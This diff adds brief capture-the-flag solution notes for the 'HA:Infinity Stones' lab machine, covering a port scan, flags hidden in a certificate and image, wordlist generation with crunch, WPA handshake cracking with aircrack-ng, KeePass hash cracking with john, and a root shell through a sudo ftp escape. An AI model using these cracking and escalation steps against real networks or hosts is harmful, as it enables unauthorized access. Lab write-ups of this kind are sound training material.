@@ -1,0 +1,112 @@
+443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA:Infinity Stones
+| ssl-cert: Subject: commonName=ignite/organizationName=MINDSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}/stateOrProvinceName=UP/countryName=IN
+
+MINDSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}
+
+exiftool space.jpg  or strings space.jpg | STONE
+
+SPACESTONE:{74E57403424607145B9B77809DEB49D0}
+
+
+root@kali:~/CTF/HA_Infinity_Stones# crunch 12 12 -t gam,%%@@2012 -o passlist.txt
+
+root@kali:~/CTF/HA_Infinity_Stones# aircrack-ng reality.cap -w passlist.txt 
+
+                              Aircrack-ng 1.5.2 
+
+      [00:00:11] 34935/1757592 keys tested (3174.11 k/s) 
+
+      Time left: 9 minutes, 2 seconds                            1.99%
+
+                         KEY FOUND! [ gamA00fe2012 ]
+
+
+      Master Key     : AB 12 E4 8E ED AB CE FB E6 58 57 3B FF 38 7C B6 
+                       58 3B A5 65 8F A3 AC 34 F9 85 82 43 0F 2A EA 40 
+
+      Transient Key  : 79 9B 88 9E F7 90 63 8F 8A BE 9A 38 00 C3 26 0C 
+                       88 26 B6 7D 62 82 FC 24 6F 48 76 9A 16 5C 23 DD 
+                       EF 51 5D 27 EA F2 70 7B FF 15 0E C6 56 1F EE CA 
+                       05 D5 D0 8E 58 FD F2 68 C5 0F D0 BC D4 CA 66 2C 
+
+      EAPOL HMAC     : 0B 91 DE 7C E6 FD 75 7B B4 CB 98 4F AE C1 65 B9 
+
+
+
+REALITYSTONE:{4542E4C233F26B4FAF6B5F3FED24280C}
+
+
+https://www.splitbrain.org/_static/ook/
+admin:avengers
+
+
+TIMESTONE:{141BC86DFD5C40E3CC37219C18D471CA}
+
+root@kali:~/CTF/HA_Infinity_Stones# keepass2john morag.kdbx > hash.txt
+root@kali:~/CTF/HA_Infinity_Stones# john hash.txt 
+
+pass = princesa
+
+bW9yYWc6eW9uZHU=
+
+POWERSTONE:{EDDF140F156862C9B494C0B767DCD412}
+
+base64----> morag:yondu
+
+
+morag@ubuntu:~$ sudo /usr/bin/ftp 
+ftp> !
+root@ubuntu:~# ls
+examples.desktop
+root@ubuntu:~# cd /root/
+root@ubuntu:/root# ls
+final.txt
+root@ubuntu:/root# cat final.txt 
+┬┬╔═╗┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┬ ┬┬  ┌─┐┌┬┐┬┌─┐┌┐┌┌─┐  ┬ ┬┌─┐┬ ┬  ┌─┐┌─┐┬ ┬┌┐┌┌┬┐  ┌┬┐┬ ┬┌─┐  ┌─┐┬┌┐┌┌─┐┬    ┌─┐┬  ┌─┐┌─┐  ┬┬
+││║  │ │││││ ┬├┬┘├─┤ │ │ ││  ├─┤ │ ││ ││││└─┐  └┬┘│ ││ │  ├┤ │ ││ ││││ ││   │ ├─┤├┤   ├┤ ││││├─┤│    ├┤ │  ├─┤│ ┬  ││
+oo╚═╝└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴─┘┴ ┴ ┴ ┴└─┘┘└┘└─┘   ┴ └─┘└─┘  └  └─┘└─┘┘└┘─┴┘   ┴ ┴ ┴└─┘  └  ┴┘└┘┴ ┴┴─┘  └  ┴─┘┴ ┴└─┘  oo
+
+                            ,g@@@@@@g,
+                           @@@@NMMN@@@g,gggpg,
+                          ]@@@`    "@@@@@@@@@@@@  ,,,,
+                          ]@@@      $@@@"   "%@@@@@@@@@@g
+                          ]@@@      $@@@     ]@@@@M*"*%@@@g@@@@@@g
+                          ]@@@      $@@@     ]@@@L     ]@@@@@NN@@@@g
+                          ]@@@      $@@@     ]@@@`     ]@@@'    ]@@@L
+                          ]@@@ggg   $@@@     ]@@@`     ]@@@      $@@P
+                          ]@@@@@@L  $@@@@@@  ]@@@L     ]@@@      $@@P
+                          ]@@@@@  1 "%@@@@F  '%@@@@@W  $@@@,,,   $@@P
+                          ]@@@@@,    $@@@L  2  ]@@@M   '%@@@@@  ]@@@@,
+                      ,,,,]@@@@@@@g@@@@@@@,   ,@@@@  3  $@@@'   '%@@@
+                  ,g@@@@@@@@@@"%%N@@NM*%@@@@@@@@@@@@,,,,@@@@L 4  ]@@@F
+                 g@@@M*"""%@@@          '"MMMMM'"%@@@@@@@@@@@@g,,g@@@M
+                j@@@F     ]@@@                     "****' "%@@@@@@@@P
+                ]@@@L     ]@@@              ,ggggg,          ''"}$@@P
+                ]@@@L  g@@@@@@            g@@@@@@@@@g      j@@@  $@@P
+                ]@@@L  %NN@@@@           $@@@C   ]@@@@     ]@@@L $@@P
+                ]@@@L     '%M"          j@@@F  6  ]@@@     ]@@@L $@@P
+                ]@@@L                   '@@@@     $@@@     ]@@@L $@@P
+                ]@@@gg@@@@w              ]@@@@ggg@@@@L     ]@@@L]@@@L
+                 %@@@@@@NM"               '%@@@@@@@M`     ;@@@M j@@@L
+                 ]@@@@     ,@@g               ''`        #@@@M )@@@M
+                 ]@@@L  5  $@@@                          `**`,@@@@F
+                  ]@@@Wggg@@@@F                           ,g@@@@@`
+                   "%@@@@@@@@@@@@@@@g                  ,@@@@@@@@@
+                       '""*%N@@@@@@@M                   *MF" '$@@@
+                            @@@@                          gg, j@@@,
+                           $@@@`                         j@@@L %@@@
+                          .@@@@                           %@@@ ]@@@
+
+
+
+                        SOULSTONE:{56F06B4DAC14CE346998483989ABFF16}    
+
+
+-----------Contact Undersigned to share your feedback with HACKING ARTICLES Teams-------------
+
+AArti Singh: https://www.linkedin.com/in/aarti-singh-353698114/
+
+Kavish Tyagi: Tyagi_kavish_ Twitter
+
